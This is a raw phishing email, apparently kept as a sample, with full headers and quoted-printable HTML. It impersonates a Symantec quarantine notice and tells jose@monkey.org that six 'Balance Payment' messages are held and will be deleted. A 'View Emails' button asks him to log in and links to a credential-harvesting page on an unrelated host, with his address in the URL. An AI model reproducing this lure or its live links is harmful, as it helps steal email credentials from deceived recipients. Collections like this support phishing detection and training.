@@ -1,0 +1,174 @@
+From jose@monkey.org Sat Mar 25 14:20:30 2023 +0000
+Return-Path: ho508@ytstar.co.kr
+Delivered-To: jose@monkey.org
+X-FDA: 80607631062.23.E14FEE9
+Received: from gw.ytstar.co.kr (gw.ytstar.co.kr [115.71.12.184])
+	by imf23.b.hostedemail.com (Postfix) with ESMTP id 45B25160009
+	for <jose@monkey.org>; Sat, 25 Mar 2023 14:20:28 +0000 (UTC)
+Authentication-Results: imf23.b.hostedemail.com;
+	dkim=none;
+	spf=pass (imf23.b.hostedemail.com: domain of ho508@ytstar.co.kr designates 115.71.12.184 as permitted sender) smtp.mailfrom=ho508@ytstar.co.kr;
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1679754029;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references; bh=afw6+JNzizpxwuK0JNBiTD7S8OEHAmPirpYbCM78VfM=;
+	b=Bq3x+aKGSLrUIrXvyD+cC5ofyZ8PKRPUpLGrBbtX2NR+gMb3RRvz2zQTQ0dCySg7HoJVS+
+	IDm562YlKz8J22fWPjJMfHDiQcTYTILinVfKqAPuWfch0FLGDPZpwUrJCwclztorvtLTvd
+	KEt5chdse8Z97LIGOAUxDrGdU/Ke/Ag=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1679754029; a=rsa-sha256;
+	cv=none;
+	b=HqEtHFFxfA3dwBL/QoE1AEV0ok65OueGQL4SGTiE/7fs2V3jOyehPdK1yH/wO++YublQEW
+	h7ObX2rkfJNuT4/o3HqWizF/kngt53C2oCU1BvDpkN/iFOwh+iu+mePkwhK9MiRaTSuAhh
+	1PF6a0bdx+2ln5BzQnTO9r/ivf1g6tQ=
+ARC-Authentication-Results: i=1;
+	imf23.b.hostedemail.com;
+	dkim=none;
+	spf=pass (imf23.b.hostedemail.com: domain of ho508@ytstar.co.kr designates 115.71.12.184 as permitted sender) smtp.mailfrom=ho508@ytstar.co.kr;
+	dmarc=none
+Received: from [147.124.212.151] ([147.124.212.151]) 
+          by gw.ytstar.co.kr ([192.168.0.19]) 
+          with ESMTP id 1679754026.799754.140059953059584.gw
+          for <jose@monkey.org>; 
+          Sat, 25 Mar 2023 23:20:10 +0900 (KST) 
+From: monkey.org    <cyb@noti.net>
+To: jose@monkey.org
+Subject: =?UTF-8?B?QWN0aW9uIFJlcXVpcmVkOiDinIkgWW91IGhhdmUgWzZdIHF1YXJhbnRpbmVkIG1lc3NhZ2Vz?=
+X-TERRACE-DUMMYSUBJECT: Terrace Spam system                                  *
+Date: 25 Mar 2023 07:20:26 -0700
+Message-ID: <20230325072026.96E8E10E87E00276@noti.net>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-TERRACE-SPAMMARK: NO       (SR:3.00)                     
+  (by Terrace)                                                   
+X-TERRACE-SID: 1679754026.799754.140059953059584.gw
+X-Rspamd-Server: rspam10
+X-Rspamd-Queue-Id: 45B25160009
+X-Stat-Signature: zwkdkdfzrfha7qk4gsm76fcixe3qp6re
+X-Spam-Status: No, score=3.30
+X-Rspam-User: 
+X-HE-Tag: 1679754028-247298
+X-HE-Meta: U2FsdGVkX19dxtZGBUvW7vokE1hdOjv9I0B/+VBY/qBpt/cwTWRfvhgIsb7EtDrGSMj/WXj8irg57hHroU+8rbehUHKDdjY6Sofu82x9E0xiqqxil4EtenfeG7jgNfZs3G9KGqAOjtCXSydycem1jPlNNxqawBV10CCLazYaBT4uaOhEEPNPBKePMOgKQh6wYm9mhW6BLQDCHoMvbcclmOc/UWqA7ik8d+pkJ8jzASQJfXpwvkRSsn6IvukBTz0nREGr05Ecn2G26ruv4CIVmXwNE5djgdHotrN1X9ghHyxpoMRaYwAa7lTETRyzfzHO0RmpuIXmQ+ExhMY1RqrQlkE51xScOUti7+o4lZNg6/g=
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 60
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.17037"></HEAD>
+<body>
+<table style=3D"FONT-SIZE: 12px; BORDER-TOP: rgb(204,204,204) 1px solid; FO=
+NT-FAMILY: ??,??; BORDER-RIGHT: rgb(204,204,204) 1px solid; BORDER-BOTTOM: =
+rgb(204,204,204) 1px solid; WORD-BREAK: break-all; COLOR: rgb(68,68,68); BO=
+RDER-SPACING: 0px; BORDER-LEFT: rgb(204,204,204) 1px solid; LINE-HEIGHT: 17=
+px; BACKGROUND-COLOR: rgb(228,228,228)" cellspacing=3D"0" cellpadding=3D"0"=
+ width=3D"100%" border=3D"0">
+<TBODY>
+<TR height=3D32>
+<td style=3D"FONT-FAMILY: Roboto,RobotoDraft,Helvetica,Arial,sans-serif; WO=
+RD-BREAK: break-all; PADDING-LEFT: 15px; LINE-HEIGHT: 17px; PADDING-RIGHT: =
+15px" valign=3D"middle" width=3D"32" align=3D"left">
+<img style=3D"BORDER-TOP: 0px; FONT-FAMILY: ??,Dotum,Helvetica,AppleGothic,=
+sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px=
+; COLOR: rgb(85,86,88); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT=
+: 0px; MARGIN: 0px; BORDER-LEFT: 0px; DISPLAY: block; PADDING-RIGHT: 0px" b=
+order=3D"0" src=3D"https://ci3.googleusercontent.com/proxy/Vet6rLKxoR5KXZeZ=
+FY43mA0yc0naVKD-1EmW-mOY4uuHqJMyoh7EiWULKCqH1EcBajc87MMaaulbdOz3Xc8U5MtRE6o=
+6AwViHIillGqyhvCWvaoHS1x_MxMzlYW-jBWGiD4VWCY=3Ds0-d-e1-ft#https://eu.quaran=
+tine.symantec.com/img/eu.quarantine.symantec.com/product-logo.png" width=3D=
+"32" height=3D"32"></TD>
+<td style=3D"FONT-FAMILY: &quot;Symantec Sans&quot;; WORD-BREAK: break-all;=
+ LINE-HEIGHT: 17px" valign=3D"middle" align=3D"left"><FONT size=3D4><FONT s=
+tyle=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-ALIGN: inherit">Em=
+ail Quarantine</FONT></FONT></FONT></TD></TR>
+<TR style=3D"PADDING-LEFT: 15px" height=3D3>
+<td style=3D"FONT-FAMILY: Roboto,RobotoDraft,Helvetica,Arial,sans-serif; WO=
+RD-BREAK: break-all; LINE-HEIGHT: 17px"><BR></TD>
+<td style=3D"FONT-FAMILY: Roboto,RobotoDraft,Helvetica,Arial,sans-serif; WO=
+RD-BREAK: break-all; LINE-HEIGHT: 17px"><BR></TD></TR></TBODY></TABLE>
+<table style=3D"FONT-SIZE: 12px; BORDER-TOP: rgb(204,204,204) 1px solid; FO=
+NT-FAMILY: ??,??; BORDER-RIGHT: rgb(204,204,204) 1px solid; BORDER-BOTTOM: =
+rgb(204,204,204) 1px solid; WORD-BREAK: break-all; COLOR: rgb(68,68,68); BO=
+RDER-SPACING: 0px; BORDER-LEFT: rgb(204,204,204) 1px solid; LINE-HEIGHT: 17=
+px" cellspacing=3D"0" cellpadding=3D"0" width=3D"100%" bgcolor=3D"#ffffff" =
+border=3D"0">
+<TBODY>
+<TR>
+<td style=3D"FONT-FAMILY: Calibri; WORD-BREAK: break-all; PADDING-BOTTOM: 0=
+px; PADDING-TOP: 0px; PADDING-LEFT: 15px; LINE-HEIGHT: 27px; PADDING-RIGHT:=
+ 15px; BACKGROUND-COLOR: rgb(236,243,249)"><B><FONT size=3D4><FONT style=3D=
+"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-ALIGN: inherit">Dear <FON=
+T color=3D#0000ff>jose@monkey.org</FONT></FONT></FONT></FONT></B></TD></TR>=
+
+<TR>
+<td style=3D"FONT-FAMILY: Calibri; WORD-BREAK: break-all; PADDING-BOTTOM: 5=
+px; PADDING-TOP: 0px; PADDING-LEFT: 15px; LINE-HEIGHT: 27px; PADDING-RIGHT:=
+ 15px; BACKGROUND-COLOR: rgb(236,243,249)"><FONT size=3D4><BR><FONT style=
+=3D"VERTICAL-ALIGN: inherit"><FONT style=3D"VERTICAL-ALIGN: inherit"><FONT =
+color=3D#0000ff>monkey.org</FONT>&nbsp;</FONT></FONT></FONT> <FONT size=3D4=
+>
+has prevented the delivery of 6 new emails to your inbox with subjects Re:B=
+alance Payment as of 3/25/2023 7:20:26 a.m. Message was identified as Spam.=
+ You can review these here and choose what happens to Your EMAILS. You can =
+also get more information about quarantined messages by clicking on the bot=
+ton&nbsp;VIEW EMAILS and Compliance Center. You'll need to Login with your =
+details to be able to access this Emails.&nbsp;&nbsp;<BR><BR></FONT></TD></=
+TR>
+<TR>
+<td style=3D"FONT-FAMILY: Roboto,RobotoDraft,Helvetica,Arial,sans-serif; WO=
+RD-BREAK: break-all; PADDING-LEFT: 15px; LINE-HEIGHT: 17px" width=3D"300" a=
+lign=3D"left"><FONT size=3D4><BR></FONT></TD></TR>
+<TR>
+<td style=3D"FONT-FAMILY: Roboto,RobotoDraft,Helvetica,Arial,sans-serif; WO=
+RD-BREAK: break-all; PADDING-BOTTOM: 5px; PADDING-TOP: 5px; PADDING-LEFT: 1=
+5px; LINE-HEIGHT: 0; PADDING-RIGHT: 15px"><FONT size=3D4>&nbsp;</FONT></TD>=
+</TR>
+<TR style=3D"MARGIN-TOP: 10px; BACKGROUND-COLOR: rgb(228,228,228)">
+<td style=3D"FONT-FAMILY: Calibri; WORD-BREAK: break-all; PADDING-BOTTOM: 1=
+0px; PADDING-TOP: 10px; PADDING-LEFT: 15px; LINE-HEIGHT: 20px; PADDING-RIGH=
+T: 15px">
+<P style=3D"BORDER-TOP: 0px; FONT-FAMILY: &#46027;&#50880;,Dotum,Helvetica,=
+AppleGothic,sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER=
+-BOTTOM: 0px; COLOR: rgb(85,86,88); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; =
+PADDING-LEFT: 0px; MARGIN: 0px; BORDER-LEFT: 0px; LINE-HEIGHT: 1.5; PADDING=
+-RIGHT: 0px"></P><FONT size=3D4><FONT style=3D"VERTICAL-ALIGN: inherit"><FO=
+NT style=3D"VERTICAL-ALIGN: inherit">Emails will be deleted automatically a=
+fter 14 days.&nbsp;</FONT>
+<FONT style=3D"VERTICAL-ALIGN: inherit">CLICK VIEW EMAILS portal.</FONT></F=
+ONT></FONT></TD></TR>
+<TR style=3D"PADDING-BOTTOM: 10px; PADDING-TOP: 0px; PADDING-LEFT: 15px; MA=
+RGIN-TOP: 10px; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(228,228,228)" ali=
+gn=3Dleft>
+<td style=3D"FONT-FAMILY: Roboto,RobotoDraft,Helvetica,Arial,sans-serif; WO=
+RD-BREAK: break-all; PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADDING-LEFT:=
+ 15px; LINE-HEIGHT: 17px">
+<table style=3D"FONT-FAMILY: ??,??; WORD-BREAK: break-all; BORDER-SPACING: =
+0px; LINE-HEIGHT: 17px" cellspacing=3D"0" cellpadding=3D"0" width=3D"100%" =
+border=3D"0">
+<TBODY>
+<TR>
+<td style=3D"FONT-FAMILY: Roboto,RobotoDraft,Helvetica,Arial,sans-serif; WO=
+RD-BREAK: break-all; LINE-HEIGHT: 17px">
+<table style=3D"FONT-FAMILY: ??,??; WORD-BREAK: break-all; BORDER-SPACING: =
+0px; LINE-HEIGHT: 17px" cellspacing=3D"0" cellpadding=3D"0" border=3D"0">
+<TBODY>
+<TR>
+<td style=3D"FONT-FAMILY: Roboto,RobotoDraft,Helvetica,Arial,sans-serif; WO=
+RD-BREAK: break-all; PADDING-BOTTOM: 7px; PADDING-TOP: 7px; PADDING-LEFT: 1=
+2px; LINE-HEIGHT: 17px; PADDING-RIGHT: 12px; border-radius: 3px" bgcolor=3D=
+"#f7941d" align=3D"center">
+<A style=3D"FONT-FAMILY: Calibri; COLOR: rgb(0,0,0); text-decoration-line: =
+none" href=3D"https://neduet.hosting.acm.org//.well-known/save/domain.html#=
+jose@monkey.org" target=3D_blank data-saferedirecturl=3D"https://www.google=
+=2Ecom/url?q=3Dhttps://storage.cloud.google.com/pu00/index%2520(1).html%23c=
+han1320@chol.com&amp;source=3Dgmail&amp;ust=3D1679793911660000&amp;usg=3DAO=
+vVaw2VJeoEPLlTvAb86RHUyPkE"><FONT style=3D"VERTICAL-ALIGN: inherit"><FONT s=
+tyle=3D"VERTICAL-ALIGN: inherit">View Emails</FONT></FONT></A></TD></TR>
+</TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
+<DIV id=3D:104 class=3D"Ar Au Ao" style=3D"DISPLAY: block">
+<DIV id=3D:104 class=3D"Ar Au Ao" style=3D"DISPLAY: block">&nbsp;</DIV></DI=
+V></BODY></HTML>
